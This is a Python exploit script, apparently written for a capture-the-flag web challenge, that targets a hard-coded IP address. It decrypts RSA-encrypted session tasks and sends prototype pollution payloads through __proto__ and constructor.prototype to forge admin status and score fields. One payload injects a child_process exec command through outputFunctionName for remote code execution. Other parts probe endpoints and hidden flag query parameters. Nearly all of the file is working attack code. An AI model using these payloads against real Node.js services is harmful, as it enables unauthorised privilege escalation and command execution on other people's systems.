import requests
import base64
import json
import re
import time

URL = "http://95.111.234.103:2900"

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def get_sd(sess):
    c = sess.cookies.get('session')
    if not c: return None
    p = 4 - len(c)%4
    if p!=4: c+='='*p
    return json.loads(base64.b64decode(c))

def decrypt(task, pk):
    key = RSA.import_key(pk)
    cb = base64.b64decode(task['c'])
    bs = key.size_in_bytes()
    pt = b''
    for i in range(0,len(cb),bs):
        pt += PKCS1_OAEP.new(key).decrypt(cb[i:i+bs])
    return pt.decode()

def solve_one(sess):
    sd = get_sd(sess)
    pt = decrypt(sd['task'], sd['key'])
    ans = re.findall(r'-?\d+', pt)[0]
    r = sess.post(f"{URL}/check-task", json={"input": ans})
    return r.json()

def solve_with_pollution(sess, pollution_json):
    """Solve one round while also sending prototype pollution payload"""
    sd = get_sd(sess)
    pt = decrypt(sd['task'], sd['key'])
    ans = re.findall(r'-?\d+', pt)[0]
    # Merge the correct answer with the pollution payload
    payload = json.loads(pollution_json)
    payload['input'] = ans
    r = sess.post(f"{URL}/check-task",
                 data=json.dumps(payload),
                 headers={"Content-Type": "application/json"})
    return r.json()

# ============================================================
# Strategy: Send various prototype pollution payloads, then
# check if a NEW session is affected (global pollution)
# ============================================================

pollution_payloads = [
    # Standard __proto__
    '{"__proto__": {"isAdmin": true, "correctAnswers": 99999, "flag": true, "win": true}}',
    # constructor.prototype (more likely to cause global pollution)
    '{"constructor": {"prototype": {"isAdmin": true, "correctAnswers": 99999}}}',
    # Nested deeper
    '{"__proto__": {"__proto__": {"isAdmin": true}}}',
    # Try setting specific app config
    '{"__proto__": {"threshold": 0, "minScore": 0, "requiredAnswers": 0}}',
    '{"constructor": {"prototype": {"threshold": 0, "minScore": 0, "requiredAnswers": 0}}}',
    # Try to pollute session properties
    '{"__proto__": {"outputFunctionName": "x]};process.mainModule.require(\'child_process\').exec(\'id\')//", "correctAnswers": 99999}}',
]

for i, pp in enumerate(pollution_payloads):
    print(f"\n=== Pollution payload {i} ===")
    print(f"  {pp[:80]}...")

    # Session A: Send pollution
    sa = requests.Session()
    sa.get(f"{URL}/generate-task")
    result = solve_with_pollution(sa, pp)
    print(f"  Pollution response: success={result.get('success')}, answered={result.get('answered')}")

    # Check ALL fields in response
    for k, v in result.items():
        if k != 'task':
            vs = str(v).lower()
            if 'flag' in vs or 'novruz' in vs or '{' in str(v):
                print(f"  *** POSSIBLE FLAG: {k}={v} ***")

    # Session B: NEW session - check if pollution persists globally
    sb = requests.Session()
    sb.get(f"{URL}/generate-task")
    sd_b = get_sd(sb)

    # Check if new session has polluted properties
    extra = {k:v for k,v in sd_b.items() if k not in ('key','task')}
    if extra:
        print(f"  New session extras: {extra}")

    # Try solving with new session - check response
    result_b = solve_one(sb)
    print(f"  New session result: { {k:v for k,v in result_b.items() if k != 'task'} }")

    sd_b2 = get_sd(sb)
    extra2 = {k:v for k,v in sd_b2.items() if k not in ('key','task')}
    print(f"  New session after solve: {extra2}")

    # Also check if generate-task returns more fields now
    resp = sb.get(f"{URL}/generate-task")
    rd = resp.json()
    gen_extra = {k:v for k,v in rd.items() if k != 'task'}
    if gen_extra:
        print(f"  generate-task extras: {gen_extra}")

    # Check main page
    r = sb.get(URL)
    if 'flag' in r.text.lower() or 'novruz' in r.text.lower():
        print(f"  *** FLAG IN HTML ***")
        print(r.text)

# ============================================================
# Try a different approach: send pollution as a separate
# request body WITHOUT the input field
# ============================================================
print("\n\n=== Pollution without input field ===")
sa = requests.Session()
sa.get(f"{URL}/generate-task")

# Send pure pollution payload to various endpoints
for ep in ['/check-task', '/generate-task', '/']:
    for method in ['POST', 'PUT', 'PATCH']:
        pollution = '{"__proto__": {"correctAnswers": 99999, "isAdmin": true, "flag": true}}'
        try:
            r = sa.request(method, f"{URL}{ep}",
                          data=pollution,
                          headers={"Content-Type": "application/json"},
                          timeout=5)
            if r.status_code != 404 and 'Cannot' not in r.text:
                print(f"  {method} {ep}: {r.status_code} - {r.text[:150]}")
        except:
            pass

# ============================================================
# Check: maybe the flag is revealed via a query parameter
# after solving enough rounds
# ============================================================
print("\n=== Query parameter approach ===")
sa = requests.Session()
sa.get(f"{URL}/generate-task")
# Solve 10 rounds first
for _ in range(10):
    solve_one(sa)

sd = get_sd(sa)
print(f"correctAnswers: {sd.get('correctAnswers')}")

# Try various query params on generate-task
for params in [
    {"getFlag": "true"},
    {"flag": "1"},
    {"admin": "true"},
    {"debug": "1"},
    {"showFlag": "1"},
]:
    r = sa.get(f"{URL}/generate-task", params=params)
    rd = r.json()
    extra = {k:v for k,v in rd.items() if k != 'task'}
    if extra:
        print(f"  {params}: {extra}")
